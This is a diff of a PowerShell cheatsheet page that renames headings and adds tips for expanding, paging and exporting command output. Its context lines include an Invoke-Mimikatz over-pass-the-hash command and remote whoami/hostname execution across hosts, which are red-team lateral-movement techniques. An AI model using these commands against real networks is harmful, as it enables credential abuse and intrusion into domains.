@@ -18,7 +18,9 @@ tags:
 weight: 10
 ---
 
-## Commonly used PowerShell (PS) commands
+This cheatsheet will continue to receive updates. 
+
+## PowerShell (PS) 101 commands
 ---
 
 Please note that all of the following commands are run from a PowerShell prompt.
@@ -62,7 +64,7 @@ List all commands in a module by running:
 Get-Command -Module <module name>
 ```
 
-## Tweaks
+## Handy Tweaks
 ---
 
 When you launch PowerShell session, it opens in the user's home directory by default. This behavior can be modified so that new PS sessions open in your custom directory. Here is how:
@@ -174,4 +176,37 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Outp
 ### Over pass-the-hash
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:NTLMHASH /run:powershell.exe"'
+```
+
+## Playing with command output
+---
+
+### 1. Expand redacted output
+
+You might notice that sometimes the output returnmed by PS commands is redacted with "...". This can be corrected by modifying the value of the PS variable - ```$FormatEnumerationLimit``` as follows.
+
+``` powershell
+$FormatEnumerationLimit = -1
+```
+
+### 2. Using 'more' command
+
+Piping output of a command to ``` more ``` command makes it readable from the first line. This is equivalent to ``` less``` command in Linux/Unix.
+
+``` powershell
+Get-Process | more
+```
+
+### 3. Using -ExpandProperty
+
+``` powershell
+Get-CimClass -Namespace root/SecurityCenter2 -MethodName * | select -ExpandProperty CimClassMethods
+```
+
+### 4. Exporting output in a CSV format
+
+Sometimes (more than we'd think) having the output in a CSV file is a blessing. Here is how it can be done using ```Export-CSV``` cmdlet.
+
+``` powershell
+Get-Date | Select-Object -Property DateTime, Day, DayOfWeek, DayOfYear | Export-Csv -Path .\DateTime.csv -NoTypeInformation
 ```
